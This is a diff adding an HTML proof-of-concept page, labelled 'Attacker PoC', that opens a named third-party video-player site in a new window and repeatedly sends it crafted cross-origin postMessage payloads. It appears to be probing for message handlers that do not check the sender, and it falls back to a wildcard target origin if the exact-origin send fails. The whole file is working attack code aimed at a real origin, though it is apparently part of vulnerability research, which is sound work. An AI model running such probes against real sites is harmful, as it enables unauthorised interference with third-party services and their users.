@@ -1,0 +1,50 @@
+<!doctype html>
+<html>
+<head><meta charset="utf-8"><title>Attacker PoC — window.open</title></head>
+<body>
+<h3>Attacker PoC — open victim and postMessage</h3>
+<p id="status">Status: not started</p>
+<script>
+(async function(){
+  const victimUrl = 'https://adtester.dailymotion.com/'; // <- REPLACE: full URL where the Dailymotion player is embedded
+  const victimOrigin = new URL(victimUrl).origin;
+
+  document.getElementById('status').innerText = 'Opening victim window...';
+
+  // open the victim in a new window/tab (same-origin is NOT required for postMessage)
+  const win = window.open(victimUrl, '_blank');
+  if(!win){
+    document.getElementById('status').innerText = 'window.open blocked — try allowing popups or use iframe method';
+    return;
+  }
+
+  // wait for the victim to load enough to accept messages
+  await new Promise(resolve => setTimeout(resolve, 4000));
+
+  document.getElementById('status').innerText = 'Posting messages to victim origin: ' + victimOrigin;
+
+  // message payload(s) — try the ones you observed earlier
+  const messages = [
+    JSON.stringify({ event: 'all', id: 'try-this-id', message: 'poc', args: {} }),
+    JSON.stringify({ event: 'ad_log', message: 'AdLoaded', args: {} })
+  ];
+
+  // repeat a few times (helps if the victim hasn't attached listeners yet)
+  let i=0;
+  const interval = setInterval(()=>{
+    if(i>=messages.length*6){ clearInterval(interval); document.getElementById('status').innerText += ' — done'; return; }
+    const msg = messages[i % messages.length];
+    console.log('sending message to victim:', msg);
+    try{
+      // send to the victim window. Use exact origin to be explicit.
+      win.postMessage(msg, victimOrigin);
+    }catch(e){
+      console.error('postMessage error', e);
+      win.postMessage(msg, '*'); // fallback (less safe)
+    }
+    i++;
+  }, 700);
+})();
+</script>
+</body>
+</html>
